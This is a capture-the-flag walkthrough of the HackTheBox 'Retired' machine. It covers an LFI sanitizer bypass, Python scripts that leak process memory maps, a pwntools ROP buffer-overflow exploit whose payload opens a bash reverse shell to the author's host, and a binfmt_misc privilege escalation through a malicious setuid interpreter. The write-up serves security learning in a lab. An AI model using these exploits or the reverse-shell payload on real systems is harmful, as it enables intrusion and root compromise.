---
description: Retired box from HackTheBox write up.
password: b5ec9d48a8c1915778b10b56497b881a
---

# Retired

## Nmap

As always the first step is to enumerate all the services to get an idea of what we can do:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.11.154 -p- --min-rate 1000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:58 EDT
Nmap scan report for 10.10.11.154
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.10.11.154 -sC -sV                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:59 EDT
Nmap scan report for 10.10.11.154
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```

Only 2 services running and one of them is SSH, since the version is pretty recent we will just start with the Nginx service and see if we can go on from there.

## Port 80

The web page is pretty basic and is not really offering much functionality (Not good for us) but I noticed something in the URL: `http://10.10.11.154/index.php?page=default.html`.

Looks like that `index.php` is including files in order to show the page. Trying to use something like `../../../../../../etc/passwd` does not work but I was able to retrieve the `index.php` file itself:

```php
# http://10.10.11.154/index.php?page=index.php

<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

The code is sanitizing the `page` parameter and that is what was messing me up earlier. The thing is that it is a custom function and it is not covering all the possibilities so using the `file://` protocol is enough to get LFI:

```bash
# http://10.10.11.154/index.php?page=file:///etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

Also, since the `readfile` function also accept a URL to a remote server RCI is possible too.

### Fuzzing to search for more pages

Just one thing, at this point this LFI/RCI thing is cool but not much to do with it so maybe there are more pages in the site? Let's fuzz the page parameter a bit:

```bash
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --hw 0 http://10.10.11.154/index.php?page=FUZZ.html 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.154/index.php?page=FUZZ.html
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                             
=====================================================================

000000040:   200        188 L    824 W      11414 Ch    "default"                                                                                           
000000885:   200        72 L     304 W      4144 Ch     "beta"

Total time: 692.0576
Processed Requests: 134823
Filtered Requests: 134821
Requests/sec.: 194.8146
```

That `beta.html` page looks like a form to upload some kind of license key to the server to get access to the beta program. The form issue a POST request to `activate_license.php`. Time to check that file using the LFI we already have:

```php
# http://10.10.11.154/index.php?page=activate_license.php

<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

So... looks like something is listenning in the server and is responsible of processing the license uploaded. Maybe the description in the form about a 512 bit key is a hint about a likely buffer overflow.

### Leaking processes

Since we know there are something listenning in the server for licenses to validate let's try to find it. Using the LFI and a little python script it is possible to leak the running processes:

```python
import requests

target_ip = '10.10.11.154'

print("Leaking processes running...")
for pid in range(10000):
    payload = f'file:///proc/{pid}/cmdline'
    url = f'http://{target_ip}/index.php?page={payload}'
    response = requests.get(url)
    if(response.text):
        print(f'PID {pid} --> {response.text}')
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 leak_program.py
Leaking processes running...
PID 417 --> /usr/bin/activate_license1337
PID 578 --> nginx: worker process
PID 579 --> nginx: worker process
PID 585 --> php-fpm: pool www
```

That `/usr/bin/activate_license1337` looks promising. Since we know that it is binded to port 1337, the numerical part is just an argument so the binary is `/usr/bin/activate_license`. Time to download it!

We can get the binary encoded as a base64 using:
```
http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license1337
```
After getting the string, we can just copy and decode in a file to get the actual binary.

### Reversing time and RCE!

Using Ghidra to check a bit how the binary is built, I found that it is vulnerable to buffer overflow. In the function `activate_license` there is a 512 bytes long buffer that it is used to hold the data sent from the web server, a 4 bytes number representing the information size added by the `activate_license.php` file and the license key entered in the form. The thing is that, when extracting this information from the socket and copying it to the buffer, the program does not check that the content of the socket fits the inside the buffer.

It is now time to write our exploit, this part really took me a long time of try and error. The idea is to use ROP to spawn a reverse shell, normally making the program spawns a shell is enough... but not in this case, we don't have access to the `activate_license` service itself.

First of all, the binary has all the protections on:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Retired]
└─$ checksec activate_license
[*] '/home/kali/Documents/HTB/Retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Since PIE and ASLR are enabled, the binary, external libraries, stack... are allocated randomly when the binary is executed. The thing is that, even though the base addresses change, the offsets from the base address to any part of the library or binary are always the same.

In order to bypass the protections, we need to somehow leak information about the base addresses of the binary in memory and also the loaded libraries. Locally, the way to do this is going to the `/proc` folder, search the folder with the PID name of the process and checking the file called `maps`:

```bash
┌──(kali㉿kali)-[/proc/5712]
└─$ cat maps       
55a4af3a5000-55a4af3a6000 r--p 00000000 08:01 3715345                    /home/kali/Documents/HTB/Retired/activate_license
55a4af3a6000-55a4af3a7000 r-xp 00001000 08:01 3715345                    /home/kali/Documents/HTB/Retired/activate_license
...
7fcd3ca34000-7fcd3ca5a000 r--p 00000000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fcd3ca5a000-7fcd3cba2000 r-xp 00026000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fcd3cba2000-7fcd3cbed000 r--p 0016e000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fcd3cbed000-7fcd3cbee000 ---p 001b9000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fcd3cbee000-7fcd3cbf1000 r--p 001b9000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fcd3cbf1000-7fcd3cbf4000 rw-p 001bc000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so
...
7ffe7dd76000-7ffe7dd97000 rw-p 00000000 00:00 0                          [stack]
7ffe7ddf5000-7ffe7ddf9000 r--p 00000000 00:00 0                          [vvar]
7ffe7ddf9000-7ffe7ddfb000 r-xp 00000000 00:00 0                          [vdso]
```

Obviously, this information is useless in the remote machine but we have LFI in the box web server so it is possible to do this same thing for it. I wrote a little Python script that first locate the process PID and then prints the memory information of the process:

```python
import requests

target_ip = '10.10.11.154'

print('Leaking process, running...')

pid = 0
for guess_pid in range(400, 10000):
	payload = f'file:///proc/{guess_pid}/cmdline'
	url = f'http://{target_ip}/index.php?page={payload}'
	response = requests.get(url)
	if(response.text and 'license' in response.text):
		pid = guess_pid
		print(f'PID {pid} --> {response.text}')
		break

print('Getting base addresses...')
response = requests.get(f'http://{target_ip}/index.php?page=file:///proc/{pid}/maps')
print(response.text)
```

The script also leaked the location of the Glibc library in the system. I decided to download it to make sure I get the offset to the `system` function right. Using Radare is easy to get the offset to the `system` function: `0x000000048e50`.

Next step is to find a `pop rdi` gadget to move the `system` function first parameter to the `rdi` register, that is how the first parameter is managed in 64 bits. A gadget is just an instruction followed by the `ret` instruction, in this case Radare reported that in the offset `0x00000000181b` of the binary we have what we want.

Only one thing left, the command to execute. Normally the string `/bin/sh` located in the Glibc is used but, as said before, that trick is useless here. The string we need is something like this: `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.78/8000 0>&1"\x00` to get a reverse shell, notice the null character at the end to mark the end of the string. In order to use that string we need to inject it in the stack as part of our payload. The problem of this approach is that, even though we know the base address of the stack, the position of the stack information vary a bit between executions so we don't really know where our argument will be.

After some time, I gave up trying to get exact the exact position of the stack injected parameter using ROP strings and I ended up using a bit of brute force. Since we know where the stack starts and ends it is possible, this is the final exploit:

```python
#! /usr/bin/env python3

from pwn import *
import requests

# Gather info

context.binary = './activate_license'
target_ip = '10.10.11.154'
url = f'http://{target_ip}/activate_license.php'

# Information from the LFI
system_got_offset = 0x000000048e50
pop_rdi_offset = 0x00000000181b
pid = 452
program_base = 0x562d2c7d5000
libc_base = 0x7f3772531000
stack_limits = [0x7ffc4cd8b000, 0x7ffc4cdac000]
stack_range = stack_limits[1] - stack_limits[0]

system_got_address = libc_base + system_got_offset
pop_rdi_address = program_base + pop_rdi_offset

print(f'Process PID ---> {pid}')
print(f'Binary base ---> {hex(program_base)}')
print(f'Libc base ---> {hex(libc_base)}')
print(f'Stack range ---> {stack_range}')

print(f'Pop rdi address ---> {hex(pop_rdi_address)}')
print(f'System address in GOT ---> {hex(system_got_address)}')


# Exploit part

command_to_execute = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.78/8000 0>&1"\x00'

with log.progress('Brute forcing stack, not fancy but works...') as p:
    # Based on some tests I did, the injected string is normally in the last part of the stack addresses
	for offset in range(stack_range - 9000, stack_range):
		p.status(f"Offset --> {offset}/{stack_range}")
		# Prepare payload
		with open("test.txt", "wb") as file_to_upload:
			junk = b'A' * 520 # 4 bytes less than expected to compensate the php file processing
			payload = p64(pop_rdi_address) + p64(stack_limits[0] + offset) + p64(system_got_address) + command_to_execute
			program_input = junk + payload
			file_to_upload.write(program_input)

		# Send payload
		with open('test.txt','rb') as file_to_upload:
			files={'licensefile': file_to_upload}
			headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5'}
			response = requests.post(url,files=files, headers=headers)

```

Not fancy but after some time waiting I got a reverse shell in my Netcat listener! We are now in the box, what a ride.

## In the machine

### Getting user

Looks like there is some kind of cron job making backups of the `html` folder running as the `dev` user. The zip files this cronjob creates are owned by `dev` but the group is `www-data` so we can read them, what about creating a soft link to the dev user home directory inside the `html` folder?

Looks like the idea worked! The full `dev` user home folder is copied and now we can access it. I will take the `dev` user private key to get a more reliable SSH session, the user flag is under:

```
/home/dev/user.txt
```

### Privesc

Inside the `dev` folder we can find the Emumu source code. Also, the program is installed and has registered something called "valid roms" to execute with Emumu.

According to the Makefile, the `reg_helper` binary has the `cap_dac_override` capability set:
```makefile
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
    @echo "[+] Installing program files"
    install --mode 0755 emuemu /usr/bin/
    mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
    install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
    setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

    @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
    echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
        | tee /usr/lib/binfmt.d/emuemu.conf \
        | /usr/lib/emuemu/reg_helper

clean:
    rm -f -- $(TARGETS)
```

This should allow this binary to bypass permissions check in the file system without `root`. Looks like the objective of this file is to just register a new binary type, in this case the Emuemu roms, to the kernel. [More information](https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/binfmt-misc.rst){:target="_blank"}

According to the string used: `:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:`, when the system try to execute a file that has `\x13\x37OSTRICH\x00ROM\x00` as magic bits it will pass the file as first argument to `/usr/bin/emuemu` and execute that instead. We can execute the installed binary `/usr/lib/emuemu/reg_helper` to add new associations, remember that the binary has the `cap_dac_override` capability so no need of `root` privileges.

My idea here is to create an association that will execute a SUID binary like `/usr/bin/newgrp` through a malicious interpreter. According to the documentation adding the flag `C` to the association configuration string will execute the interpreter as `root` in case of a SUID binary, this is called a shadow SUID.

Using a hexadecimal editor, I took the first 52 bytes of the `/usr/bin/newgrp` binary and used them as the byte sequence my association is matching for. Why 52 bytes? Well I took all the bytes needed to find difference between `/usr/bin/newgrp` and the other binaries to avoid matching all of them.

Only one  thing left, creating the interpreter and the association:

```c
// Compiled with gcc mal.c -o mal
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    // Even though the interpreter runs as root the effective UID used is from the user running the binary. This makes sure the effective UID is what we want
    setuid(0);
    setgid(0);

    system("/bin/bash -p");
    return 1;
}
```

```
echo ':MAL:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47::/home/dev/emuemu/mal:C' | /usr/lib/emuemu/reg_helper
```

Everything is ready, when we execute the `newgrp` binary a root shell is spawned as expected!

```bash
dev@retired:~/emuemu$ newgrp 
root@retired:~/emuemu#
```

The `root` flag is under:

```
/root/root.txt
```